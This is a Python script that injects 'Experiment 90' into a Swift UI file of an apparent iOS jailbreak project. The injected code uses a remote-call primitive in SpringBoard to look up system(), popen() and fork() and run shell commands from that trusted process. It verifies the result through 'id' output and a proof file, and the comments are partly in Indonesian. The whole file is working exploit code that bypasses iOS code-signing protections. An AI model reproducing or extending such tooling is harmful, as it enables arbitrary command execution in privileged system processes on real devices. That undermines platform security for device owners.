#!/usr/bin/env python3
"""Add Exp 90 - call system()/popen() from SpringBoard RC"""

SWIFT_FILE = r'd:\Backup\Personal\Hp\iPhone\DSPloit\lara\views\root\AMFIExperimentView.swift'

with open(SWIFT_FILE, 'r', encoding='utf-8') as f:
    content = f.read()

# Add button
button_anchor = '                pathButton(\n                    title: "\u2463 Test Binary Spawn",'
button_idx = content.find(button_anchor)
if button_idx == -1:
    print("ERROR: button anchor not found")
    exit(1)

new_button = '''                pathButton(
                    title: "\u2462l SB system() (Exp 90)",
                    icon: "terminal",
                    color: .green,
                    label: "SB system",
                    action: runExp90SBSystem,
                    needsVerified: false,
                    needsProbe: false
                )

'''
content = content[:button_idx] + new_button + content[button_idx:]

# Add function
func_anchor = '    // MARK: - Dump amfid binary'
func_idx = content.find(func_anchor)
if func_idx == -1:
    print("ERROR: func anchor not found")
    exit(1)

new_func = '''    // MARK: - Exp 90: system() / popen() from SpringBoard

    /// Exp 90: Call system(), popen(), execve() dari SpringBoard RC.
    /// Ini BUKAN spawn binary baru — ini call libc function yang sudah ada.
    /// system() internally calls fork+exec — tapi dari trusted process context.
    private func runExp90SBSystem() {
        isRunning = true
        runningLabel = "SB system"
        guard mgr.rcready else {
            isRunning = false
            runningLabel = ""
            return
        }

        #if !DISABLE_REMOTECALL
        guard let sb = dspmgr.shared.sbProc else {
            results.insert(ExperimentResult(
                name: "SB system() (Exp 90)", success: false,
                detail: "No SpringBoard RC", timestamp: Date()
            ), at: 0)
            isRunning = false
            runningLabel = ""
            return
        }

        DispatchQueue.global(qos: .userInitiated).async {
            let result = self.expSBSystem(sb: sb)
            DispatchQueue.main.async {
                self.results.insert(result, at: 0)
                self.isRunning = false
                self.runningLabel = ""
            }
        }
        #else
        isRunning = false
        runningLabel = ""
        #endif
    }

    #if !DISABLE_REMOTECALL
    private func expSBSystem(sb: RemoteCall) -> ExperimentResult {
        let expName = "SB system() (Exp 90)"
        var detail = "Experiment 90: system()/popen() from SpringBoard\\n"
        detail += "=================================================\\n\\n"
        detail += "mprotect(RX) works tapi call crash (APRR block unsigned page).\\n"
        detail += "Alternative: call EXISTING functions (system, popen) yang sudah signed.\\n\\n"

        let mem = sb.trojanMem
        let RTLD_DEFAULT: UInt64 = UInt64(bitPattern: -2)

        // === Test A: Cek apakah system() ada ===
        detail += "=== Test A: dlsym system() ===\\n"
        let systemSym = remote_alloc_str(sb, "system")
        let systemAddr = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, systemSym)
        RootExecutor.rcall(sb, "free", systemSym)
        detail += "system(): 0x\\(String(format: \\"%llx\\", systemAddr))\\n"

        if systemAddr != 0 {
            detail += "system() FOUND!\\n\\n"

            // Coba system("id > /var/tmp/.dsp_system_out")
            detail += "--- system(\\"id > /var/tmp/.dsp_system_out\\") ---\\n"
            let cmd1 = remote_alloc_str(sb, "id > /var/tmp/.dsp_system_out")
            let ret1 = RootExecutor.rcallAddr(sb, systemAddr, cmd1)
            RootExecutor.rcall(sb, "free", cmd1)
            detail += "ret=\\(ret1)\\n"

            if ret1 == 0 || (ret1 & 0xFF) == 0 {
                detail += "system() returned success-ish!\\n"

                // Baca output file
                let outPath = remote_alloc_str(sb, "/var/tmp/.dsp_system_out")
                let outFd = RootExecutor.rcall(sb, "open", outPath, UInt64(O_RDONLY), 0)
                if outFd != UInt64(bitPattern: -1) {
                    let readBuf = mem + 0x3000
                    let n = RootExecutor.rcall(sb, "read", outFd, readBuf, 256)
                    RootExecutor.rcall(sb, "close", outFd)
                    if n > 0 && n < 256 {
                        // Read output as string
                        var outBytes = [UInt8]()
                        for i in 0..<min(Int(n), 128) {
                            let b = sb[readBuf + UInt64(i)].value8()
                            if b == 0 { break }
                            outBytes.append(b)
                        }
                        let outStr = String(bytes: outBytes, encoding: .utf8) ?? "(binary)"
                        detail += "Output: \\(outStr)\\n"
                        if outStr.contains("uid=") {
                            detail += "\\n\\U0001F3C6\\U0001F3C6\\U0001F3C6 SYSTEM() WORKS! \\U0001F3C6\\U0001F3C6\\U0001F3C6\\n"
                            detail += "Command execution dari SpringBoard!\\n"
                            detail += "FULL JAILBREAK ACHIEVED!\\n"
                        }
                    } else {
                        detail += "Output file empty atau read gagal (n=\\(n))\\n"
                    }
                } else {
                    detail += "Output file tidak ada (system mungkin gagal execute)\\n"
                }
                RootExecutor.rcall(sb, "unlink", outPath)
                RootExecutor.rcall(sb, "free", outPath)
            } else {
                detail += "system() returned \\(ret1) (non-zero = error)\\n"
                detail += "Kemungkinan: /bin/sh tidak ada di iOS 18\\n"
            }

            // Coba system("touch /var/tmp/.dsp_proof")
            detail += "\\n--- system(\\"touch /var/tmp/.dsp_proof\\") ---\\n"
            let cmd2 = remote_alloc_str(sb, "touch /var/tmp/.dsp_proof")
            let ret2 = RootExecutor.rcallAddr(sb, systemAddr, cmd2)
            RootExecutor.rcall(sb, "free", cmd2)
            detail += "ret=\\(ret2)\\n"

            // Check if file exists
            let proofPath = remote_alloc_str(sb, "/var/tmp/.dsp_proof")
            let proofCheck = RootExecutor.rcall(sb, "access", proofPath, 0)
            detail += "access(.dsp_proof): \\(proofCheck == 0 ? \\"EXISTS!\\": \\"not found\\")\\n"
            if proofCheck == 0 {
                detail += "\\U0001F3C6 touch WORKED! File created via system()!\\n"
                RootExecutor.rcall(sb, "unlink", proofPath)
            }
            RootExecutor.rcall(sb, "free", proofPath)
        } else {
            detail += "system() NOT FOUND\\n"
        }

        // === Test B: popen() ===
        detail += "\\n=== Test B: dlsym popen() ===\\n"
        let popenSym = remote_alloc_str(sb, "popen")
        let popenAddr = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, popenSym)
        RootExecutor.rcall(sb, "free", popenSym)
        detail += "popen(): 0x\\(String(format: \\"%llx\\", popenAddr))\\n"

        if popenAddr != 0 {
            detail += "popen() FOUND!\\n"
            // popen("id", "r") -> FILE*
            let cmd = remote_alloc_str(sb, "id")
            let mode = remote_alloc_str(sb, "r")
            let fp = RootExecutor.rcallAddr(sb, popenAddr, cmd, mode)
            detail += "popen(\\"id\\", \\"r\\"): fp=0x\\(String(format: \\"%llx\\", fp))\\n"

            if fp != 0 {
                // fread from fp
                let freadSym = remote_alloc_str(sb, "fread")
                let freadAddr = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, freadSym)
                RootExecutor.rcall(sb, "free", freadSym)

                if freadAddr != 0 {
                    let readBuf = mem + 0x3200
                    let nRead = RootExecutor.rcallAddr(sb, freadAddr, readBuf, 1, 128, fp)
                    detail += "fread: \\(nRead) bytes\\n"
                    if nRead > 0 {
                        var outBytes = [UInt8]()
                        for i in 0..<min(Int(nRead), 64) {
                            let b = sb[readBuf + UInt64(i)].value8()
                            if b == 0 { break }
                            outBytes.append(b)
                        }
                        let outStr = String(bytes: outBytes, encoding: .utf8) ?? "(binary)"
                        detail += "Output: \\(outStr)\\n"
                        if outStr.contains("uid=") || outStr.contains("mobile") {
                            detail += "\\n\\U0001F3C6 POPEN WORKS! Command output captured!\\n"
                        }
                    }
                }

                // pclose
                let pcloseSym = remote_alloc_str(sb, "pclose")
                let pcloseAddr = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, pcloseSym)
                if pcloseAddr != 0 { RootExecutor.rcallAddr(sb, pcloseAddr, fp) }
                RootExecutor.rcall(sb, "free", pcloseSym)
            }
            RootExecutor.rcall(sb, "free", cmd)
            RootExecutor.rcall(sb, "free", mode)
        }

        // === Test C: fork + execve ===
        detail += "\\n=== Test C: fork() ===\\n"
        let forkRet = RootExecutor.rcall(sb, "fork")
        detail += "fork(): ret=\\(forkRet)\\n"
        if forkRet == 0 {
            detail += "We are in child! (should not see this from parent RC)\\n"
        } else if forkRet != UInt64(bitPattern: -1) {
            detail += "fork() returned child PID=\\(forkRet)!\\n"
            detail += "\\U0001F3C6 FORK WORKS dari SpringBoard!\\n"
            // Kill child
            RootExecutor.rcall(sb, "kill", forkRet, 9)
            RootExecutor.rcall(sb, "waitpid", forkRet, mem + 0x3400, 0)
        } else {
            let forkErr = remote_errno(sb)
            detail += "fork() gagal: errno=\\(forkErr)\\n"
        }

        // Summary
        detail += "\\n=== SUMMARY ===\\n"
        let success = detail.contains("\\U0001F3C6")
        if success {
            detail += "\\U0001F3C6 CODE/COMMAND EXECUTION ACHIEVED!\\n"
        } else {
            detail += "system/popen/fork semua gagal dari SpringBoard.\\n"
        }

        return ExperimentResult(name: expName, success: success, detail: detail, timestamp: Date())
    }
    #endif

'''

content = content[:func_idx] + new_func + content[func_idx:]

with open(SWIFT_FILE, 'w', encoding='utf-8') as f:
    f.write(content)

print("OK - added Exp 90")
